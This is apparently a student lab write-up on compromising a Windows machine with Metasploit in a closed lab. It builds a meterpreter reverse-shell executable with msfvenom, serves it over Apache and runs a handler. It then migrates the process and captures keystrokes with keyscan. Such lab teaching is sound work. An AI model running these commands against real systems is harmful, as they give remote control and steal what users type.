# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig
## OUTPUT:
![WhatsApp Image 2025-04-20 at 08 09 04_4867da55](https://github.com/user-attachments/assets/c4758ba2-22f9-491a-a98e-49181e8cc58d)





Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT
![WhatsApp Image 2025-04-20 at 08 11 32_8d286a33](https://github.com/user-attachments/assets/9e89cc2c-7e3f-4701-9853-11af448d4a41)






copy the fun.exe into the apache /var/www/html folder
![WhatsApp Image 2025-04-20 at 08 13 00_4ca2c83c](https://github.com/user-attachments/assets/ca0125ba-e5bb-4f2e-bb9e-84cf29999884)




Start apache server
sudo systemctl apache2 start
![image](https://github.com/user-attachments/assets/e6e7d070-d72c-408d-a1f4-77f5cb003f98)



Check the status of apache2
![image](https://github.com/user-attachments/assets/61dcbda4-c69c-47b6-ada7-fe6b8838eb39)




Invoke msfconsole:
## OUTPUT:




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.


Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
![Screenshot 2025-04-07 115214](https://github.com/user-attachments/assets/ea384ca5-6c96-405e-9b45-b23f4e9fab41)




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![Screenshot 2025-04-07 115416](https://github.com/user-attachments/assets/c77d859f-ec36-4ce5-a9d5-e54633f390c7)



Bypass any warning boxes, double-click the file, and allow it to run.


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![Screenshot 2025-04-07 115242](https://github.com/user-attachments/assets/13ef9689-8a76-4d7c-bb44-0e4ee9807099)




Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![{F7D2ED4C-13F1-4F4C-B951-BEB85E88527E}](https://github.com/user-attachments/assets/337f3a58-b9d7-413a-9619-eaa764b32dd9)



keyscan_dump	Shows the keystrokes captured so far

![{970C702A-B8E4-4F86-8022-F68564FCAD87}](https://github.com/user-attachments/assets/42a6d320-d01e-4694-addb-c39220915f08)




## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
